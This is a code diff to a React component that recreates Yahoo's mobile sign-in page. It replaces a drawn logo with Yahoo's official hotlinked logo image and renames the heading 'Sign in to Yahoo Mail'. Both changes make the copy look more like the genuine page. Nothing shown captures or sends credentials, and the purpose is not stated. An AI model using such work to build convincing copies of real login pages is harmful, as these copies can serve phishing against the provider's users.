@@ -28,23 +28,15 @@ const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSucc
     }
   };
 
+  // Use the correct image URL for the logo
   const YahooLogo = ({ className = '' }: { className?: string }) => (
-    <svg className={`h-7 text-purple-600 ${className}`} viewBox="0 0 136 40" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-      <path d="M43.4357 0.932129L35.313 18.2754L27.1903 0.932129H18.129L31.2516 25.105V39.0679H39.3742V25.105L52.4968 0.932129H43.4357Z" />
-      <path d="M60.1064 39.0679H68.229V0.932129H60.1064V39.0679Z" />
-      <path d="M83.8296 0.932129L71.3916 23.4795V39.0679H79.5142V23.4795L91.9522 0.932129H83.8296Z" />
-      <path d="M109.186 39.7523C116.151 39.7523 121.849 34.0543 121.849 27.2798C121.849 20.3148 116.151 14.8073 109.186 14.8073C102.221 14.8073 96.523 20.3148 96.523 27.2798C96.523 34.0543 102.221 39.7523 109.186 39.7523ZM109.186 32.553C105.892 32.553 104.245 29.8988 104.245 27.2798C104.245 24.6608 105.892 21.8161 109.186 21.8161C112.48 21.8161 114.127 24.6608 114.127 27.2798C114.127 29.8988 112.48 32.553 109.186 32.553Z" />
-      <path d="M129.288 39.0679H136V0.932129H129.288C129.288 10.3541 129.288 23.67 129.288 39.0679Z" />
-      <path d="M9.19522 0.932129C3.12516 0.932129 0.442993 4.22631 0.442993 9.34526V18.8544H18.129V9.34526C18.129 4.22631 15.4468 0.932129 9.19522 0.932129Z" />
-      <path d="M0.442993 23.4795V39.0679H18.129V23.4795H0.442993Z" />
-      <path d="M52.4968 0.932129L55.5323 7.00218C57.0218 10.5446 58.6968 14.2496 59.9439 17.5901H60.1064C61.3535 14.2496 63.0285 10.5446 64.518 7.00218L67.5535 0.932129H76.451L64.843 23.4795V39.0679H56.7204V23.4795L45.1124 0.932129H52.4968Z" />
-    </svg>
+    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className={`select-none ${className}`} />
   );
 
   return (
     <div className="min-h-screen bg-white font-sans flex flex-col">
       <header className="flex justify-between items-center p-4">
-        <YahooLogo />
+        <YahooLogo className="h-7" />
         <div className="flex items-center space-x-3 text-xs text-gray-600">
           <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
           <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
@@ -56,7 +48,7 @@ const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSucc
         <div className="w-full max-w-sm">
           <YahooLogo className="h-8 mx-auto mb-4" />
           <h2 className="text-center text-xl font-semibold text-gray-900">
-            {!showPasswordStep ? 'Sign in' : 'Enter password'}
+            {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
           </h2>
           <p className="text-center text-sm text-gray-500 mt-1">
             using your Yahoo account
